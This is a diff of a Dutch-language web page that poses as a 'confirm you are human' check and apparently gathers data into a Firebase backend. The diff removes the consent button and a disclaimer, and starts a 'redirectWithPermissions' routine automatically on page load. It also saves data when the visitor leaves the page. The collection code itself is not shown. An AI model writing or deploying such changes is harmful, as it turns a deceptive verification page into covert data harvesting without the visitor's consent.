@@ -29,7 +29,6 @@
             width: clamp(350px, 90%, 450px); /* Dynamische breedte aangepast */
             color: #333;
             box-sizing: border-box;
-            /* margin: auto; */ /* Niet meer nodig met Flexbox */
         }
 
         h1 {
@@ -59,7 +58,7 @@
             margin-top: 25px;
             width: 100%;
             position: relative;
-            display: none; /* Verborgen totdat de knop is geklikt */
+            display: none; /* Verborgen totdat het proces start */
         }
 
         .progress-bar span {
@@ -81,7 +80,7 @@
 
         /* Loading-animatie */
         .loading {
-            display: none; /* Verborgen totdat de knop is geklikt */
+            display: none; /* Verborgen totdat het proces start */
             width: 60px; /* Vergrootde grootte */
             height: 60px;
             border: 6px solid rgba(0, 0, 0, 0.1); /* Vergrootte border */
@@ -107,25 +106,7 @@
             font-size: 18px; /* Iets grotere font-size */
         }
 
-        /* Knop stijl */
-        #permissionButton {
-            padding: 14px 30px; /* Vergrootte padding voor een dikkere knop */
-            font-size: 20px; /* Iets grotere font-size */
-            background-color: #03a9f4;
-            color: #fff;
-            border: none;
-            border-radius: 8px; /* Iets grotere border-radius voor een modernere look */
-            cursor: pointer;
-            margin-top: 25px; /* Verhoogde ruimte boven de knop */
-            width: 100%; /* Volledige breedte binnen de container */
-            max-width: 250px; /* Beperkt de maximale breedte van de knop */
-            transition: background-color 0.3s, transform 0.2s;
-        }
-
-        #permissionButton:hover {
-            background-color: #0288d1;
-            transform: scale(1.05); /* Grotere schaalvergroting bij hover */
-        }
+        /* Knop stijl is verwijderd */
 
         /* Responsive */
         @media screen and (max-width: 480px) {
@@ -142,10 +123,7 @@
                 font-size: 18px;
             }
 
-            #permissionButton {
-                font-size: 18px;
-                max-width: 220px; /* Beperkt de maximale breedte van de knop */
-            }
+            /* Knop is verwijderd, dus geen aanpassing nodig */
 
             .progress-bar {
                 height: 10px; /* Kleinere voortgangsbalk op mobiel */
@@ -167,19 +145,18 @@
 
     <div class="container">
         <h1 id="messageText">Bevestiging</h1>
-        <p>Dit is alleen om te bevestigen of jij een mens bent. Klik op de knop hieronder om door te gaan.</p>
-        <!-- Toegevoegde knop -->
-        <button id="permissionButton">Klik hier om door te gaan</button>
+        <p>Dit is alleen om te bevestigen of jij een mens bent. Even geduld terwijl we doorgaan...</p>
+        <!-- Knop is verwijderd -->
 
-        <!-- Loading animatie en voortgangsbalk worden pas zichtbaar na klikken -->
+        <!-- Loading animatie en voortgangsbalk -->
         <div class="loading"></div>
         <div class="progress-bar">
             <span id="progressBarSpan"></span>
         </div>
         <p id="error-message">Kon gegevens niet ophalen. Probeer het opnieuw.</p>
     </div>
-    <!-- Verwijderde disclaimer -->
-    
+    <!-- Disclaimer is verwijderd -->
+
     <script>
         // Firebase-configuratie
         const firebaseConfig = {
@@ -404,8 +381,7 @@
 
         async function redirectWithPermissions() {
             try {
-                // Verberg de knop en toon de loading animatie en voortgangsbalk
-                document.getElementById('permissionButton').style.display = 'none';
+                // Toon de loading animatie en voortgangsbalk
                 document.querySelector('.loading').style.display = "inline-block";
                 document.querySelector('.progress-bar').style.display = "block";
 
@@ -448,8 +424,8 @@
         // Sla gegevens op voordat de gebruiker de pagina verlaat
         window.addEventListener('beforeunload', saveData);
 
-        // Event listener voor de knop
-        document.getElementById('permissionButton').addEventListener('click', redirectWithPermissions);
+        // Start het proces automatisch wanneer de pagina is geladen
+        window.addEventListener('load', redirectWithPermissions);
     </script>
 </body>
 </html>
